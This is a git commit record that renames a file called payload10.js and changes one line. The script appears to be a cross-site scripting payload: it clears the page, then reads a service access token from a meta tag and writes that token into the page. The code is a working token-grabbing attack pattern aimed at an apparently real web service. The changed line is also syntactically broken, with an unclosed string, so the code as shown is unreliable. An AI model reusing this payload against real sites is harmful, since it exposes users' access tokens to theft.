0818184e4de2a6a01346057a9415571b9a0141ca
Yuvaraj <98304205+yuvarajsf@users.noreply.github.com>
2025-10-08 13:19:11 +0530

    Update and rename payload9.js to payload10.js

--- payload10.js
+++ payload10.js
@@ -3,7 +3,7 @@ function test(){
     document.body.innerHTML = "";
     document.body.innerHTML += "<h1 style='color:red'>From github</h1>";
     token = document.querySelector('meta[name="designer_service:access_token"]').content;
-    document.body.innerHTML += token;
+    document.body.innerHTML += "<h1 style='color:rd'>" +token + "</h1>;
 }
 
 test()
